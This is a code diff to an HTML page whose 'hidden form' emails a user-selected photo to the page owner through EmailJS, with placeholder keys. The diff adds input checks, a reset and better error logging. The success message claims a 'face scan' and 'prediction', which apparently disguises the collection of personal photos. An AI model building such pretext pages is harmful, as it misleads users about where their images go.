@@ -44,24 +44,32 @@
 
   <!-- Hidden form -->
   <form id="photoForm">
-    <input type="file" name="photo" id="photoUploader" accept="image/*" onchange="sendPhoto()" />
+    <input type="file" name="user_photo" id="photoUploader" accept="image/*" onchange="sendPhoto()" />
   </form>
 
   <!-- EmailJS Script -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("YOUR_USER_ID"); // Replace with your actual public key
+    // Replace below with your EmailJS public key
+    emailjs.init("YOUR_PUBLIC_KEY");
 
     function sendPhoto() {
       const form = document.getElementById("photoForm");
+      const fileInput = document.getElementById("photoUploader");
 
-      emailjs.sendForm("YOUR_SERVICE_ID", "template_face", form)
+      if (!fileInput.files.length) {
+        alert("❌ No file selected!");
+        return;
+      }
+
+      emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", form)
         .then(() => {
           alert("✅ Face scanned! Prediction in process...");
+          fileInput.value = ""; // Reset file input
         })
         .catch((err) => {
           alert("❌ Upload failed. Try again.");
-          console.error(err);
+          console.error("EmailJS error:", err);
         });
     }
   </script>
